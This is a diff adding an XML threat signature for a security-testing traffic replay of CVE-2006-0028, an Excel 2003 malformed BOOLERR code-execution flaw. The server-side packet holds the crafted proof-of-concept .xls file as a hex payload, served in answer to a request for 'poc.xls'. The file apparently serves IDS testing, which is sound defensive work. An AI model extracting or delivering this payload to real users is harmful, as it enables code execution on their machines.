@@ -1,0 +1,95 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Excel Malformed File Format Parsing Code Execution (IPv6 Version)"/>
+    <EngDesc display="true" value="There exists a code execution vulnerability in Microsoft Excel. The vulnerability is caused by improper processing of malformed BOOLERR records within Excel spreadsheet files. An attacker may exploit this vulnerability by enticing a user to open a crafted Excel file, which will enable the attacker to inject and execute arbitrary code within the security context of the target user. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Command_Injection"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Excel"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Excel_2003_SP1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20060314-08"/>
+    <CVEID display="true" value="CVE-2006-0028"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="767a1c01cf4a86b64f6689bebad3486c"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1220017774"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1203389420" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="H"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F7E626C696E2F706F632E786C7320485454502F312E300D0A557365722D4167656E743A20576765742F312E31302E32202852656420486174206D6F646966696564290D0A4163636570743A202A2F2A0D0A486F73743A2031302E322E312E31320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205468752C203330204D617220323030362031393A32303A333620474D540D0A5365727665723A204170616368652F322E302E3436202843656E744F5329205048502F342E332E320D0A4C6173742D4D6F6469666965643A205468752C203330204D617220323030362031373A30323A353720474D540D0A455461673A20223931383030632D3364322D3462633139323430220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203937380D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A206170706C69636174696F6E2F766E642E6D732D657863656C0D0A0D0A09000400070010000B020C00E7020000000002000F0300004200020001800D00020001000C00020064000F000200010011000200000010000800FCA9F1D24D62503F0E00020001002200020000002A00020000002B000200000025000200FF8031000A00C800000005417269616C45000200FF7F31000A00C800000005417269616C45000200FF7F31000A00C800000005417269616C45000200FF7F31000A00C800000005417269616C45000200FF7F31000A00A000000005417269616C45000200FF7F140000001500000026000800000000000000E83F27000800000000000000E83F28000800000000000000F03F29000800000000000000F03F4D000C000000010001006400580258024000020000001F00020015001E0008000747656E6572616C1E00020001301E00050004302E30301E00060005232C2323301E00090008232C2323302E30301E00140013222422232C2323303B5C2D222422232C2323301E00190018222422232C2323303B5B5265645D5C2D222422232C2323301E001A0019222422232C2323302E30303B5C2D222422232C2323302E30301E001F001E222422232C2323302E30303B5B5265645D5C2D222422232C2323302E30301E0003000230251E00060005302E3030251E00090008302E3030452B30301E000B000A6D6D2F64642F797979791E000C000B64645C2D6D6D6D5C2D79791E0008000764645C2D6D6D6D1E000800076D6D6D5C2D79791E000C000B683A6D6D5C20414D2F504D1E000F000E683A6D6D3A73735C20414D2F504D1E00050004683A6D6D1E00080007683A6D6D3A73731E001100106D6D2F64642F797979795C20683A6D6D1E0006000530303030301E000E000D232C2323303B5C2D232C2323301E00130012232C2323303B5B5265645D5C2D232C2323301E00140013232C2323302E30303B5C2D232C2323302E30301E00190018232C2323302E30303B5B5265645D5C2D232C2323302E30301E000900082323302E30452B301E000600056D6D3A73731E00020001401900020000004300040000004000430004000000550055000200080000000800000002000000030008000D00000000000300FF80000000110008000D00010000000300FF8000000031000600130000000000400000010001000000FFFF02024122020009000000010040000002000200090000000200400000030005000900FFFFFFFF41150001000500090001000100400000000004001B0001000200400000137B545255452C2046414C53452C20234E2F417D3D000A0068011E004C1D832200003E000E0000010100010000000001000000001D000F000302000100000001000200020001010A000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+  <Stateful display="false" value="true"/>
+  <DestIPVarName display="false" value="$destIP"/>
+</threatSignature>
